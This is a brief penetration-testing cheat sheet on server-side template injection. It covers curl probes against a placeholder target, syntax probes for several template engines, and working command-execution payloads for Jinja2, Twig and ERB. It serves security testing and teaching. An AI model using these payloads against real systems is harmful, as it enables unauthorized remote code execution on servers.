# Server-side template injection (SSTI)

[← Foothold quick reference](../02-foothold.md)

Check previews, email/PDF templates, CMS content, and greetings.

## First check

Compare plain input with two expressions:

```bash
curl -sG 'http://<target>/preview' --data-urlencode 'name=probe-plain-end'
curl -sG 'http://<target>/preview' --data-urlencode 'name=probe-{{7*7}}-end'
curl -sG 'http://<target>/preview' --data-urlencode 'name=probe-{{7*8}}-end'
```

Expected: `probe-49-end`, then `probe-56-end`. Literal braces: try the actual renderer or another syntax.

Syntax probes:

```text
{{7*7}}       Jinja, Twig, and other curly-brace engines
${7*7}       FreeMarker and other dollar-expression engines
<%= 7*7 %>   ERB and other tag-based engines
```

Jinja `{{7*'7'}}` → `7777777`; Twig → `49`. Confirm with framework/errors and raw response, not browser DOM alone.

## After evaluation

After evaluation, match engine/version before testing its object access:

```text
Jinja2: {{ cycler.__init__.__globals__.os.popen('id').read() }}
Twig:   {{ ['id']|filter('system') }}
ERB:    <%= `id` %>
```

Engine-specific; sandbox/context may block them.

[OWASP SSTI testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection/18-Server-side_Template_Injection) · [PortSwigger's engine comparison](https://portswigger.net/web-security/server-side-template-injection)
